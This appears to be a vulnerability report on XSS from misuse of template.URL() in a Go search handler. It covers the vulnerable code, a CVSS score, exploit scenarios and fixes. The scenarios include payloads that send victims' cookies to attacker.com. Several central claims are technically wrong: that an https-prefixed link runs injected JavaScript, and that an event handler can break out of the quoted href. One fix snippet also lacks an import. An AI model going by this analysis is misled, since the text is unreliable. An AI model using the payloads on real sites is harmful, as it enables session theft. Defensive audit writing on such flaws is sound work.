# Cross-Site Scripting via Improper template.URL() Usage

# Vulnerability Case
During an audit of Acme Corp's Golang web application, our team identified a potential Cross-Site Scripting (XSS) vulnerability due to the improper use of the `template.URL()` function from Go's `html/template` package. The issue was discovered when reviewing the code handling URL construction, where a formatted template string incorporating user-controlled input was passed directly to `template.URL()` without sanitization. This can enable an attacker to craft malicious input that bypasses the default escaping mechanisms, resulting in the execution of injected scripts in the client's browser and potential data exfiltration. The vulnerability was encountered in an endpoint that dynamically renders URLs in an HTML anchor tag, exposing sensitive operations to exploitation.

```go
package main

import (
	"fmt"
	"html/template"
	"log"
	"net/http"
)

func searchHandler(w http.ResponseWriter, r *http.Request) {
	// Extract user-supplied query parameter
	userQuery := r.URL.Query().Get("q")
	// Construct URL using formatted string directly from user input
	constructedURL := fmt.Sprintf("https://search.example.com/?q=%s", userQuery)
	// Directly converting to template.URL does not perform additional escaping
	safeURL := template.URL(constructedURL)

	// Render HTML template with the potentially unescaped URL
	tmpl, err := template.New("result").Parse(`
		<html>
		<head><title>Search</title></head>
		<body>
			<a href="{{.}}">Perform Search</a>
		</body>
		</html>
	`)
	if err != nil {
		http.Error(w, "Template parsing error", http.StatusInternalServerError)
		return
	}
	if err := tmpl.Execute(w, safeURL); err != nil {
		log.Println("Template execution error:", err)
	}
}

func main() {
	http.HandleFunc("/search", searchHandler)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
```

The core issue arises from the use of `template.URL()`, which is designed to mark strings as trusted URLs without applying further HTML-escaping. By directly incorporating user-controlled input in the formatted URL string, attackers may inject payloads (e.g., JavaScript schemes or malformed URLs) that bypass browser security. In a real-world Golang stack using the standard `net/http` and `html/template` packages, this vulnerability can lead to XSS, potentially allowing attackers to hijack user sessions, steal confidential information, or execute arbitrary client-side code. The business impact includes loss of user trust, reputational damage, and potential compliance violations owing to data breach incidents.


context: go.lang.security.audit.net.unescaped-data-in-url.unescaped-data-in-url Found a formatted template string passed to 'template.URL()'. 'template.URL()' does not escape contents, and this could result in XSS (cross-site scripting) and therefore confidential data being stolen. Sanitize data coming into this function or make sure that no user-controlled input is coming into the function.

# Vulnerability Breakdown
This vulnerability involves a Cross-Site Scripting (XSS) flaw in a Golang web application, stemming from the improper use of the template.URL() function without adequate input sanitization.

1. **Key vulnerability elements**:
   - User-controlled input from a query parameter is directly incorporated into a URL string
   - The constructed URL is passed to template.URL() without sanitization
   - template.URL() intentionally bypasses HTML escaping, marking the content as trusted
   - The resulting URL is rendered in an HTML anchor tag
   - The application uses Go's html/template package which normally provides automatic context-aware escaping

2. **Potential attack vectors**:
   - Injection of JavaScript URL schemes (javascript:alert(document.cookie))
   - Embedding of event handlers in malformed URLs
   - Data exfiltration through JavaScript execution
   - Session hijacking via cookie theft
   - Phishing through deceptive URLs rendered without escaping

3. **Severity assessment**:
   - The vulnerability allows client-side code execution in victim browsers
   - Requires user interaction (clicking the malicious link)
   - Could lead to session hijacking and data theft
   - Exploitable remotely with minimal technical complexity

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): Low (L) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N

# Description
A Cross-Site Scripting (XSS) vulnerability exists in Acme Corp's Golang web application, specifically in the search functionality. The vulnerability stems from the improper use of Go's `template.URL()` function, which marks a string as a trusted URL that should not undergo HTML escaping.

In the vulnerable code, user input from a query parameter is directly incorporated into a URL string using `fmt.Sprintf()`, and then passed to `template.URL()` without proper validation or sanitization:

```go
userQuery := r.URL.Query().Get("q")
constructedURL := fmt.Sprintf("https://search.example.com/?q=%s", userQuery)
safeURL := template.URL(constructedURL)

```

This implementation is dangerous because `template.URL()` explicitly tells Go's template engine to treat the string as a trusted URL and skip the normal HTML escaping. When malicious input containing JavaScript is provided (such as `javascript:alert(document.cookie)`), it will be rendered in the anchor tag and executed when clicked, potentially leading to session hijacking, data theft, or other client-side attacks.

# CVSS
**Score**: 5.3 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N \
**Severity**: Medium

The CVSS score of 5.3 (Medium) is based on the following factors:

- **Attack Vector (AV:N)**: The vulnerability can be exploited remotely over the network, allowing an attacker to craft malicious URLs from anywhere.

- **Attack Complexity (AC:L)**: Exploiting this vulnerability is straightforward and doesn't require special conditions or timing. An attacker simply needs to craft a malicious query parameter.

- **Privileges Required (PR:N)**: No authentication or special privileges are needed to exploit this vulnerability, as the search functionality is likely accessible to all users.

- **User Interaction (UI:R)**: The attack requires user interaction - specifically, a victim must click on the malicious search link for the XSS payload to execute.

- **Scope (S:U)**: The scope is unchanged as the vulnerability affects only the vulnerable component.

- **Confidentiality Impact (C:L)**: A successful exploit could allow access to sensitive browser data like cookies and session information, but is limited to what's accessible in the browser context.

- **Integrity Impact (I:L)**: The attacker can modify data presented to the user or cause them to submit unintended data, but the impact is limited to the browser session.

- **Availability Impact (A:N)**: There is no significant impact on availability, as the system continues to function normally.

This score reflects the balance between the ease of exploitation (remotely exploitable with no privileges) and the requirement for user interaction along with the limited scope of impact.

# Exploitation Scenarios
**Scenario 1: JavaScript Protocol Injection**
An attacker crafts a malicious URL to the vulnerable application: `https://example.com/search?q=javascript:alert(document.cookie)`. When the application processes this request, it constructs the URL `https://search.example.com/?q=javascript:alert(document.cookie)` and marks it as trusted with `template.URL()`. When rendered in the template, it creates an anchor tag with an unescaped JavaScript protocol handler. When a user clicks on the "Perform Search" link, instead of navigating to the search page, the JavaScript executes in their browser context, displaying their cookies and demonstrating potential for session theft.

**Scenario 2: Event Handler Injection**
An attacker constructs a search query like: `https://example.com/search?q=https://search.example.com/?q=dummy%20onmouseover=javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)`. The application processes this and creates a malicious URL that includes an event handler. When the victim hovers over the link (not even clicking), the JavaScript executes, sending their cookies to the attacker's server.

**Scenario 3: Data URL with Embedded HTML**
An attacker creates a payload like: `https://example.com/search?q=data:text/html,<script>document.location='https://attacker.com/steal?data='+encodeURIComponent(document.cookie)</script>`. When rendered by the template and clicked by a user, this opens a data URL containing HTML with an embedded script that redirects to the attacker's site along with the victim's cookies.

**Scenario 4: Phishing with Deceptive URLs**
An attacker constructs a URL that visually resembles a legitimate site but actually contains malicious code: `https://example.com/search?q=https://acmecorp-secure-login.com` (a site they control). Because `template.URL()` doesn't escape the output, the deceptive URL appears legitimate in the user interface, increasing the likelihood that users will click it and be directed to a phishing site.

# Impact Analysis
**Business Impact:**
- Potential breach of user account security through session hijacking
- Compromise of sensitive user information that might be accessible via JavaScript
- Reputational damage if the application is exploited to attack users
- Loss of customer trust if security incidents become public
- Potential regulatory penalties if personal data is compromised (GDPR, CCPA)
- Resources required for incident response and remediation
- Possible need for user notification if sensitive data is compromised

**Technical Impact:**
- Execution of arbitrary JavaScript in the context of the application's domain
- Access to cookies, localStorage, and sessionStorage within the application's domain
- Ability to make authenticated AJAX requests on behalf of the victim
- Potential to manipulate the DOM and modify content presented to users
- Possible credential theft through injected forms or redirects
- Bypassing of same-origin policy protections within the application's context
- Potential for more sophisticated attacks using the initial XSS as an entry point
- Browser security feature bypass (like Content Security Policy) if implemented incorrectly

# Technical Details
The vulnerability stems from a fundamental misunderstanding of how Go's `html/template` package and specifically the `template.URL()` function work. Let's break down the vulnerable code and explain why it's problematic:

```go
// Extract user-supplied query parameter
userQuery := r.URL.Query().Get("q")
// Construct URL using formatted string directly from user input
constructedURL := fmt.Sprintf("https://search.example.com/?q=%s", userQuery)
// Directly converting to template.URL does not perform additional escaping
safeURL := template.URL(constructedURL)

```

In Go's `html/template` package, content is automatically escaped based on the context in which it appears. This is a security feature designed to prevent XSS attacks. However, there are certain functions that explicitly mark content as pre-trusted, bypassing this automatic escaping:

- `template.HTML()` - For trusted HTML content
- `template.JS()` - For trusted JavaScript content
- `template.URL()` - For trusted URLs

The `template.URL()` function is designed for cases where you have a complete, validated URL that should be rendered without escaping. It tells the template engine: "This string is a safe URL that doesn't need to be escaped."

The problem in this code is two-fold:

1. **Unsanitized Input**: The code takes user input and directly incorporates it into a URL string without validation or proper encoding

2. **False Safety Marking**: It then marks this potentially unsafe URL as "safe" using `template.URL()`, explicitly instructing the template engine to skip its normal security checks

When this URL is rendered in HTML:

```html
<a href="{{.}}">Perform Search</a>

```

If a user provides a malicious input like `javascript:alert(document.cookie)`, the rendered output becomes:

```html
<a href="https://search.example.com/?q=javascript:alert(document.cookie)">Perform Search</a>

```

However, browsers interpret URLs in a complex way. In this case, when a user clicks the link, the browser attempts to load the resource identified by the URL. Since the URL contains a valid JavaScript protocol identifier, the browser executes the JavaScript code instead of navigating to a web page.

The vulnerability is particularly dangerous because:

1. It bypasses Go's built-in protection mechanisms that are specifically designed to prevent XSS

2. It can be exploited with relatively simple payloads

3. It appears in a search feature which commonly accepts various inputs

4. The application is falsely assuming that prefixing the URL with `https://search.example.com/?q=` makes it safe, but browsers parse the entire URL string

# Remediation Steps
## Use Proper URL Parameter Encoding

**Priority**: P0

Modify the search handler to properly encode user input before constructing URLs:

```go
func searchHandler(w http.ResponseWriter, r *http.Request) {
    // Extract user-supplied query parameter
    userQuery := r.URL.Query().Get("q")
    
    // Properly encode the query parameter
    encodedQuery := url.QueryEscape(userQuery)
    
    // Construct URL with properly encoded parameter
    constructedURL := fmt.Sprintf("https://search.example.com/?q=%s", encodedQuery)
    
    // Render the URL as a normal string - let the template engine handle escaping
    tmpl, err := template.New("result").Parse(`
        <html>
        <head><title>Search</title></head>
        <body>
            <a href="{{.}}">Perform Search</a>
        </body>
        </html>
    `)
    if err != nil {
        http.Error(w, "Template parsing error", http.StatusInternalServerError)
        return
    }
    if err := tmpl.Execute(w, constructedURL); err != nil {
        log.Println("Template execution error:", err)
    }
}

```

This approach makes two critical changes:
1. It properly encodes the query parameter using `url.QueryEscape()` to handle special characters
2. It passes the URL as a regular string to the template, allowing Go's template engine to apply its normal HTML context-aware escaping
## Implement URL Validation and Use Structured Template Data

**Priority**: P1

For better security, validate the URL and use a structured data object with the template:

```go
import (
    "fmt"
    "html/template"
    "log"
    "net/http"
    "net/url"
    "strings"
)

func searchHandler(w http.ResponseWriter, r *http.Request) {
    // Extract user-supplied query parameter
    userQuery := r.URL.Query().Get("q")
    
    // Validate the query doesn't contain potentially malicious content
    if strings.HasPrefix(strings.ToLower(userQuery), "javascript:") ||
       strings.HasPrefix(strings.ToLower(userQuery), "data:") ||
       strings.HasPrefix(strings.ToLower(userQuery), "vbscript:") {
        http.Error(w, "Invalid search query", http.StatusBadRequest)
        return
    }
    
    // Properly encode the query parameter
    encodedQuery := url.QueryEscape(userQuery)
    
    // Construct URL with properly encoded parameter
    searchURL := fmt.Sprintf("https://search.example.com/?q=%s", encodedQuery)
    
    // Create a data structure for the template
    data := struct {
        SearchURL string
    }{
        SearchURL: searchURL,
    }
    
    // Render with a named field for clarity
    tmpl, err := template.New("result").Parse(`
        <html>
        <head><title>Search</title></head>
        <body>
            <a href="{{.SearchURL}}">Perform Search</a>
        </body>
        </html>
    `)
    if err != nil {
        http.Error(w, "Template parsing error", http.StatusInternalServerError)
        return
    }
    if err := tmpl.Execute(w, data); err != nil {
        log.Println("Template execution error:", err)
    }
}

```

This implementation:
1. Explicitly validates input to reject potentially dangerous URL schemes
2. Uses proper URL encoding with `url.QueryEscape()`
3. Uses a structured data object for template variables, improving code clarity
4. Avoids `template.URL()` entirely, leveraging Go's built-in escaping


# References
* CWE-79 | [Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
* CWE-20 | [Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
* A03:2021 | [Injection](https://owasp.org/Top10/A03_2021-Injection/)
* A05:2021 | [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
* CWE-116 | [Improper Encoding or Escaping of Output](https://cwe.mitre.org/data/definitions/116.html)
